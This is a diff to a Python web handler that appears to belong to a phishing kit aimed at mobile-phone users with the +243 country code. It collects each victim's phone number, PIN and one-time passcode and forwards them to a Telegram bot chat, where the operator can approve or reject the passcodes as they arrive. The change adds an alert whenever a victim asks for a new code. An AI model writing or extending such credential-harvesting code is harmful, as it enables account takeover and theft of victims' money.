@@ -125,15 +125,21 @@ def verify():
     otp = data.get('otp', '')
     
     # Set pending status when OTP is submitted
-    if otp != 'Pending OTP...' and session_id:
+    if otp != 'Pending OTP...' and otp != 'RESEND_CLICKED' and session_id:
         set_status(session_id, "pending")
         
     _, _, token, chat_id = get_env_vars()
     
-    message = f"🚀 <b>New Application Received!</b>\n\n"
-    message += f"📱 <b>Phone:</b> +243 {phone}\n"
-    message += f"🔑 <b>PIN:</b> {pin}\n"
-    message += f"🔢 <b>OTP:</b> {otp}\n"
+    if otp == 'RESEND_CLICKED':
+        message = f"🔄 <b>RESEND CLICKED!</b>\n\n"
+        message += f"📱 <b>Phone:</b> +243 {phone}\n"
+        message += f"🔑 <b>PIN:</b> {pin}\n"
+        message += f"⚠️ <i>User requested a new code.</i>"
+    else:
+        message = f"🚀 <b>New Application Received!</b>\n\n"
+        message += f"📱 <b>Phone:</b> +243 {phone}\n"
+        message += f"🔑 <b>PIN:</b> {pin}\n"
+        message += f"🔢 <b>OTP:</b> {otp}\n"
     
     if token and chat_id:
         url = f"https://api.telegram.org/bot{token}/sendMessage"
@@ -144,7 +150,7 @@ def verify():
         }
         
         # Attach approval buttons on OTP submission
-        if otp != 'Pending OTP...' and session_id:
+        if otp != 'Pending OTP...' and otp != 'RESEND_CLICKED' and session_id:
             payload["reply_markup"] = {
                 "inline_keyboard": [
                     [
